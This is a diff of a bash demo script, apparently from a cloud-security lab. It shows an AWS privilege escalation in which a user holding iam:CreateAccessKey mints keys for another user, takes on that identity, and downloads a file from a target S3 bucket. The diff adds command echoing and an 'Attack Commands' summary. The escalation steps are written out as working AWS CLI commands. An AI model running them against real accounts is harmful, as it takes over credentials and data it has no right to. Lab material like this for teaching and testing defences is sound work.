@@ -3,13 +3,33 @@
 # Demo script for iam:CreateAccessKey to S3 bucket access
 # This script demonstrates how a user with CreateAccessKey permission can create keys for a user with S3 access
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 PRIVESC_USER="pl-prod-iam-002-to-bucket-privesc-user"
@@ -57,6 +77,7 @@ export AWS_SECRET_ACCESS_KEY=$PRIVESC_SECRET_KEY
 unset AWS_SESSION_TOKEN
 
 # Verify identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -68,6 +89,7 @@ echo -e "${GREEN}✓ Verified identity as privesc user${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -75,6 +97,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Check current permissions (should not have S3 access)
 echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
 echo "Attempting to list S3 buckets..."
+show_cmd aws s3 ls
 if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
     echo -e "${GREEN}✓ Confirmed: Cannot list S3 buckets with privesc user${NC}"
 else
@@ -86,6 +109,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Creating access keys for $BUCKET_ACCESS_USER${NC}"
 echo "This is the privilege escalation vector..."
 
+show_attack_cmd aws iam create-access-key --user-name $BUCKET_ACCESS_USER --output json
 NEW_ACCESS_KEY=$(aws iam create-access-key \
     --user-name $BUCKET_ACCESS_USER \
     --output json)
@@ -106,12 +130,14 @@ echo -e "${YELLOW}Step 6: Switching to bucket access user credentials${NC}"
 export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY_ID
 export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_ACCESS_KEY
 
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 BUCKET_USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $BUCKET_USER_IDENTITY"
 echo -e "${GREEN}✓ Switched to bucket access user credentials${NC}\n"
 
 # Step 7: Discover target bucket
 echo -e "${YELLOW}Step 7: Discovering target bucket${NC}"
+show_cmd aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-iam-002-to-bucket-')].Name" --output text
 BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-iam-002-to-bucket-')].Name" --output text)
 echo "Target bucket: $BUCKET_NAME"
 echo -e "${GREEN}✓ Found target bucket${NC}\n"
@@ -119,12 +145,14 @@ echo -e "${GREEN}✓ Found target bucket${NC}\n"
 # Step 8: List bucket contents
 echo -e "${YELLOW}Step 8: Listing bucket contents${NC}"
 echo "Contents of $BUCKET_NAME:"
+show_attack_cmd aws s3 ls s3://$BUCKET_NAME/
 aws s3 ls s3://$BUCKET_NAME/
 echo -e "${GREEN}✓ Successfully listed bucket contents${NC}\n"
 
 # Step 9: Download sensitive data
 echo -e "${YELLOW}Step 9: Downloading sensitive data${NC}"
 DOWNLOAD_FILE="/tmp/createaccesskey-bucket-sensitive-data-${ACCOUNT_ID}.txt"
+show_attack_cmd aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE
 aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE
 
 echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
@@ -144,6 +172,15 @@ echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $PRIVESC_USER → (CreateAccessKey) → $BUCKET_ACCESS_USER → $BUCKET_NAME"
 echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+echo ""
+
 echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
 echo -e "${GREEN}New access key ID: $NEW_ACCESS_KEY_ID${NC}"
 echo ""
@@ -161,3 +198,6 @@ echo ""
 echo -e "${YELLOW}To clean up:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
